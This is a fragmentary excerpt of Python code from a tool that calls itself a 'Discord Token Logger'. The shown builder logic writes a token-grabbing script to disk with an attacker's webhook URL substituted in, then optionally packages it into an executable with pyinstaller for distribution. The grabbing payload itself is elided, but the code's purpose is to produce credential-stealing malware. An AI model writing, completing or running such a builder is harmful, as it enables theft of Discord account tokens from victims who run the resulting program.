...
if os.name == "nt":
    os.system(f'title Discord Token Logger - Mon')
...
def tokengrabber():
    ...
    try:
        with open(f"files/{fileName}.py", "w") as file:
...
main()""".replace("~~TOKENURLHERE~~", webhooklink))
    ...
    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "files/{fileName}.py" """)
    ...
    if convert == 'Y' or convert == 'y':
        try:
                ...
                time.sleep(1)
                os.system(f"pyinstaller -y -F files/{fileName}.py")
                os.system('cls' if os.name == 'nt' else 'clear')
